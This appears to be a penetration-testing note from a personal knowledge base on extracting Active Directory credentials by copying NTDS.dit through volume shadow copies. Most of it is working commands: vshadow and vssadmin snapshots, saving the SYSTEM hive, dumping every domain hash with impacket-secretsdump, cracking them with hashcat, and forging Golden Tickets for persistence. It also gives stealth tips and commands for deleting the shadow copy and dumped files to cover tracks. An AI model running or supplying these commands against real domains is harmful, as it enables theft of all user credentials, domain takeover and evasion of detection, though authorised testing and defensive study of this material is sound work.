---
title: Shadow Copies
draft: false
tags:
  - windows
  - post-exploitation
  - recon
  - info-gathering
  - active
  - active-directory
---
 
A shadow copy is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

> [!Requirements]
> Domain admin access.

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

We obtain:
- All NTLM password hashes for each AD user.
- All kerberos keys for each AD user.

1. Access the DC as a Domain Admin user and spawn an elevated Powershell session.
2. Perform a shadow copy of the NTDS database:
```powershell
PS C:\> vshadow.exe -nw -p  C:

Parameters:
-nw: disable writers (speeds up process)
-p: store the copy on disk

*take note of the Shadow copy device name: SHADOW_COPY_PATH*
```

3. Copy the Shadow Copy to the C:\ drive:
```powershell
PS C:\> copy SHADOW_COPY_PATH\windows\ntds\ntds.dit c:\ntds.dit.bak
```

> [!Note]
> Specify the SHADOW_COPY_PATH and add at the end the NTDS path (`windows\ntds\ntds.dit`)

4. Save the SYSTEM hive from the Windows registry:
```powershell
PS C:\> reg.exe save hklm\system c:\system.bak
```

5. Extract the credentials:
```powershell
PS C:\> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

Parameters:
-ntds: NTDS database
-system: SYSTEM hive
LOCAL: parse the files locally
```

**Alternative (recommended)**

If vshadow is not available on the target system, we can use vssadmin from an administrative shell:

1. Create a volume shadow copy:
```
vssadmin create shadow /for=C:
```

Copy the Shadow Copy VOLUMENAME (`\\?\GLOBALROOT\...`)

2. Retrieve the ntds.dit file:
```
copy VOLUMENAME\Windows\ntds\ntds.dit C:\Windows\Temp\ntds.dit
```

3. Extract the SYSTEM hive:
```powershell
PS C:\> reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

4. Extract the credentials:
```powershell
PS C:\> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

Parameters:
-ntds: NTDS database
-system: SYSTEM hive
LOCAL: parse the files locally
```

---
# Bonus
```powershell
PS> klist purge (deletes all tickets for current session. Useful if we generated a bad ticket)

or

mimikatz # kerberos::purge
```

---

# After dumping NTDS.dit

Once `impacket-secretsdump` has parsed the database, you hold the NTLM hash of **every** domain account, including `krbtgt`. That opens several follow-up paths:

- Reuse any hash directly with [[Pass the Hash (PtH)]] for lateral movement.
- Crack the extracted NTLM hashes offline to recover cleartext passwords:
```bash
$ hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```
- Forge a **Golden Ticket** from the `krbtgt` hash for long-term domain persistence (see [[Silver Ticket]] for the ticket-forging workflow; a Golden Ticket forges a TGT instead of a service ticket).

> [!Tip]
> A shadow copy is a **noisy, high-privilege** action. If you already control a Domain Admin session and only need the hashes, [[AD DCSync]] pulls them straight from the DC over the MS-DRSR replication protocol without writing any files to disk — usually stealthier than staging `ntds.dit` on `C:\`.

> [!Warning]
> Creating a volume shadow copy and dropping `ntds.dit` / SYSTEM hive on disk generates Event IDs (e.g. 8222 VSS, plus file-creation telemetry). Clean up the `.bak` files and the shadow copy afterwards:
> ```powershell
> PS C:\> vssadmin delete shadows /for=C: /oldest
> PS C:\> del C:\ntds.dit.bak, C:\system.bak
> ```

---

### Related notes
- [[AD DCSync]] — fileless credential extraction from the DC (stealthier alternative).
- [[Pass the Hash (PtH)]] — reusing the recovered NTLM hashes.
- [[Silver Ticket]] — Kerberos ticket forging with recovered keys.
- [[Active Directory Penetration Testing]] — where this fits in the overall AD kill chain.